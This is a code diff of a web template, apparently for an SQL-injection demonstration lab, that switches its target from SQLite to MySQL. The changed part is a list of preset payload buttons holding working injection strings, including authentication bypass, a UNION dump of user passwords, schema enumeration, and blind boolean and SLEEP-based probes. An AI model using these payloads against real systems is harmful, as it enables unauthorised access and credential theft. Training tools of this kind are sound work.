@@ -256,7 +256,7 @@
                 <div class="d-flex justify-content-between align-items-center">
                     <div>
                         <div style="font-size:0.9rem; font-weight:700; color:var(--text-primary);">Total Latency Kueri</div>
-                        <div style="font-size:0.75rem; color:var(--text-muted); margin-top:2px;">Waktu eksekusi langsung ke engine SQLite</div>
+                        <div style="font-size:0.75rem; color:var(--text-muted); margin-top:2px;">Waktu eksekusi langsung ke database MySQL</div>
                     </div>
                     <span style="font-family: var(--font-mono); font-size: 1.2rem; font-weight: 700; color: var(--brand-danger); background: var(--bg-danger-subtle); border: 1px solid var(--brand-danger-glow); padding: 4px 10px; border-radius: 6px;">
                         {{ result.sql_latency_ms }} ms
@@ -439,11 +439,11 @@
                     ("Classic Auth Bypass",       "' OR '1'='1' --"),
                     ("Admin Comment Bypass",       "admin' --"),
                     ("UNION Dump All Users",       "' UNION SELECT id, username, password FROM users --"),
-                    ("UNION Schema Enum",          "' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --"),
+                    ("UNION Schema Enum",          "' UNION SELECT 1, table_name, table_schema FROM information_schema.tables WHERE table_schema=database() --"),
                     ("Boolean Blind (char test)",  "' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --"),
-                    ("SQLite Version Fingerprint", "' UNION SELECT 1, sqlite_version(), 3 --"),
+                    ("MySQL Version Fingerprint", "' UNION SELECT 1, version(), 3 --"),
                     ("Error-Based Type Mismatch",  "' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 'boom' END) --"),
-                    ("Time-Based Blind",           "' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN (SELECT COUNT(*) FROM sqlite_master m1, sqlite_master m2) ELSE 0 END) --")
+                    ("Time-Based Blind",           "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --")
                 ] %}
                 <button type="button" class="payload-btn js-payload-btn"
                     data-value="{{ pl | e }}"
